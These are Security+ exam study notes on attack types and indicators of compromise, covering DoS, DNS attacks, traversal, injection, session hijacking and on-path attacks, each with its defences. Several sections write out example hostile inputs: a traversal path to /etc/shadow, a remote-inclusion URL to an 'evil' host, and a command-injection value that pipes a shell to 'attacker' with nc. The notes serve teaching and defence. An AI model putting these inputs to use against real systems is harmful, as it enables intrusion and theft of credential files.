# Section 19 — Malicious Activity (SY0-701 Study Notes)

Objective 2.4: "Given a scenario, analyze indicators of malicious activity." This is the second half of the heaviest exam domain — expect "identify the attack/IoC from a scenario or log" questions throughout.

## 177–178 — Denial of Service & Distributed Denial of Service

DoS is a **category**, not one attack — anything that makes a system's resources unavailable to legitimate users.

- **Flood attack**: send more packets than the target can handle.
  - **Ping flood**: floods with ICMP echo requests. Common defense: block/drop echo replies at the firewall → attacker gets timeouts.
  - **SYN flood**: send many SYN packets (often from spoofed IPs), never complete the 3-way handshake → server holds resources for half-open connections until exhausted. Defenses: **flood guards** (dedicated devices or router/firewall feature), **timeouts on half-open requests** (10/15/30 s), **IPS detection**.
- **PDoS (permanent DoS)**: exploits a flaw to **re-flash firmware** and permanently brick a device; needs a full firmware reload — reboot does not help.
- **Fork bomb**: spawns processes that fork exponentially, consuming all CPU. **Not a worm** — doesn't infect programs or spread over the network; only consumes resources on one machine.
- **DDoS**: hundreds/thousands of machines (zombies/bots in a **botnet**) attack one target simultaneously. Record: GitHub March 2018, ~1.35 Tbps, down ~5 minutes.
- **DNS amplification**: spoof the victim's IP in small DNS queries to open resolvers; the large responses flood the victim.
- **Defenses**: **blackholing/sinkholing** (route attacker IPs to a null interface — temporary, attacker moves IPs); IPS (only for small attacks); **elastic/scaling cloud** (works but expensive); specialized providers — **Cloudflare, Akamai** (WAF filtering + content distribution, absorb the attack).

## 179 — DNS Attacks

| Attack | How it works | Mitigation |
|---|---|---|
| **DNS cache poisoning (spoofing)** | Corrupt a resolver's cache with false records → users redirected to attacker IPs (fake banking site) | **DNSSEC** (digital signatures on DNS data), secure configs/firewalls |
| **DNS amplification** | Spoofed small queries → open DNS servers send big responses to victim | Limit/rate-limit DNS response sizes |
| **DNS tunneling** | Encapsulate HTTP/SSH data inside DNS (port 53) to bypass firewalls; used for **C2 and exfiltration** | Monitor/analyze DNS logs for unusual patterns |
| **Domain hijacking (theft)** | Change domain registration without the registrant's permission → site control lost | Secure registrar account, **registry lock services** |
| **DNS zone transfer attack** | Attacker pretends to be an authorized system, requests a copy of the whole zone (all records) → recon for future attacks | Restrict zone transfers to authorized servers |

## 180 — Directory Traversal (Path Traversal)

- Injection attack giving access to files outside the **web document root** via `../` (Linux/Mac, `..\\` on Windows — IIS often accepts both).
- Example: `site.com/../../../../etc/shadow`.
- Can be **URL-encoded to evade filters**: `%2e%2e%2f` = `../`.
- **File inclusion**:
  - **Remote file inclusion (RFI)**: app loads a script from a remote URL, e.g. `?user=http://evil/malicious.php`.
  - **Local file inclusion (LFI)**: includes a file already on the server, e.g. `../../Windows/system32/cmd.exe` — often with a **`%00` null byte** to truncate appended extensions (e.g., the forced `.php`).
- **Exam tip**: see `../` in a proxy log → **directory traversal or local file inclusion**. Input validation prevents it.

## 181 — Execution & Escalation Attacks

- **Arbitrary code execution**: run attacker's code locally on the target.
- **Remote code execution (RCE)**: a type of arbitrary code execution done **over the network** — "if I can touch your machine and load my software, that's arbitrary; over the internet, that's remote."
- **Privilege escalation**: accessing/modifying resources you're not entitled to; goal = admin/root/domain admin.
  - **Vertical**: normal user → higher level (user → admin/root). The classic image.
  - **Horizontal**: same level, but someone else's resources (reading George's files on a share, running as George).
- Injected code inherits the **privileges of the process it runs in** — system-service compromise = SYSTEM-level code execution.
- **Rootkits**: malware that modifies system files (often **kernel level**) to hide its presence; enables stealth, persistence across reboots/logoffs, and installing more malware.
  - **Protection rings**: ring 0 = kernel (most privileged); drivers ring 1–2; applications ring 3.
  - **Kernel-mode rootkit** (ring 0): complete control — the most dangerous.
  - **User-mode rootkit**: admin-level but relies on OS features (registry, Task Scheduler) for persistence.

## 182 — Replay Attacks

- **Fraudulent rebroadcast/repetition/delay of a valid data transmission.** Intercept → analyze → retransmit later (vs. session hijacking, where the attacker modifies live traffic in real time).
- Example: capture a bank login session, replay it later to log in as the victim; capture shopping-site credentials and use them, or change the password to lock the victim out.
- **Mitigations**: **session tokens** (unique per session), **MFA** (one-time codes that rotate every 30–60 s make replayed logins worthless), modern protocols — **WPA3**.

## 183 — Session Hijacking

- Spoofing attack: attacker takes over a valid session — by spoofing the original host's IP or **stealing/modifying session cookies**.
- HTTP is **stateless** → state kept in cookies or server-side DB.
  - **Session cookie** = non-persistent, in-memory, deleted when the browser closes.
  - **Persistent cookie** = stored in browser cache until expiry/deletion.
  - Cookies carrying confidential data must be **encrypted**.
- **Session prediction**: guessing a predictable session token. Tokens must be truly random, non-predictable, reveal nothing about the client, **one-time use per session**.
- **Cookie poisoning**: modifying a cookie after it was issued to exploit the web app. Defenses: input validation, **encryption in transit and storage**, delete cookies from cache when the session ends, keep them short-lived.

## 184 — On-Path Attacks (Man-in-the-Middle)

- Attacker places their workstation **logically between two hosts** to capture, monitor, and relay traffic transparently.
- Enablers: **ARP poisoning, DNS poisoning, rogue wireless AP, rogue hover switch**.
- **Replay** (from the on-path position): capture valid data and repeat it immediately or later — e.g., replay a captured wireless auth handshake to be treated as authenticated.
- **Relay**: attacker becomes a proxy between the two hosts — can read, capture (credentials, bank balances), or **modify** traffic before passing it on.
- **Encryption is the big obstacle** → attacker counter-techniques:
  - **SSL stripping**: downgrade/trick the user from HTTPS to **HTTP** so traffic is plaintext.
  - **Downgrade attack**: force client/server to abandon high security for a **lower but backwards-compatible** mode (e.g., negotiate SSL 2.0 instead of TLS 1.3; the lock icon still shows). Works against any negotiated protection — Wi-Fi, VPNs, TLS.

## 185 — Injection Attacks (LDAP, Command, Process)

- **LDAP injection**: fabricate LDAP statements via user input — e.g., entering `*` (wildcard) as the username dumps all users from the directory. Targets auth/directories. Prevention: **input validation/sanitization** (same as SQLi/XMLi).
- **Command injection**: execute arbitrary **shell commands** through a vulnerable web app — e.g., a "ping this host" form field where `host && command` runs the second command too (`&& hostname`, or `&& /bin/sh | nc attacker 443` for a reverse shell). Prevention: **input validation** — accept only the expected format (IP/hostname), ignore everything else.
- **Process injection**: run arbitrary code **inside the address space of another live process** → inherits its memory, resources, and possibly elevated privileges, and **evades detection** by hiding under a legitimate process. Techniques: DLL injection, thread-execution hijacking, **process hollowing**, **process doppelganging**, asynchronous procedure calls, portable executable injection.
  - Mitigations: endpoint security blocking common attack-behavior sequences, **kernel security modules**, **least privilege**.

## 186 — Indicators of Compromise (IoCs)

Forensic data signaling potentially malicious activity — hints, not proof; investigate before concluding breach.

| IoC | What it looks like |
|---|---|
| **Account lockouts** | Repeated failed logins → brute-force attempt (or a mistyping user — balance security vs. usability) |
| **Concurrent session usage** | One account active from two places/devices at once — possible account sharing by attacker |
| **Blocked content** | Repeated attempts to reach/download blocked (malicious or sensitive) content |
| **Impossible travel** | Logins from distant locations within a time window that physical travel can't bridge (NY then London in an hour) |
| **Resource consumption** | Sudden CPU/memory/bandwidth/GPU spikes — malware, DDoS, or **crypto-mining zombie** (e.g., 90% GPU while browsing) |
| **Resource inaccessibility** | Files/databases suddenly unreachable — classic **ransomware** sign (plus ransom note) |
| **Out-of-cycle logging** | Activity at 3 AM / weekends when nobody works — attacker hiding in off-hours |
| **Missing logs** | Gaps in logs — attacker deleted them to cover tracks |
| **Publicized breach** | Attacker posts/discloses the hack (forums, social media, defaced website) |

---

### High-yield rapid-fire list
- Half-open TCP connections → **SYN flood** → flood guards, short timeouts, IPS.
- Bricked firmware → **PDoS**. Forking processes → **fork bomb** (not a worm).
- `../` in proxy logs → **directory traversal / LFI**; `%2e%2e%2f` = encoded version; `%00` = null-byte truncation.
- Small query, big spoofed response → **DNS amplification**. Malware in DNS port-53 traffic → **DNS tunneling**.
- Poisoned resolver cache → redirect to fake site → **DNS cache poisoning** → **DNSSEC**.
- Wrong domain registration → **domain hijacking** → registry lock. Full zone copy request → **zone transfer attack**.
- User → admin = **vertical** escalation; George's files = **horizontal**.
- Ring 0 rootkit = **kernel mode** = most dangerous; registry/Task Scheduler persistence = **user mode**.
- Re-broadcasting a captured valid transmission → **replay** → session tokens + MFA + WPA3.
- HTTPS forced to HTTP → **SSL stripping**; TLS 1.3 → SSL 2.0 negotiation → **downgrade attack**.
- `*}` in LDAP search → **LDAP injection**. `&&` in a ping form → **command injection**. Code under a legit process → **process injection** (hollowing/doppelganging).
- NY→London in 1 hour → **impossible travel**. 90% GPU at idle → crypto-miner. Missing log gap → attacker covering tracks.
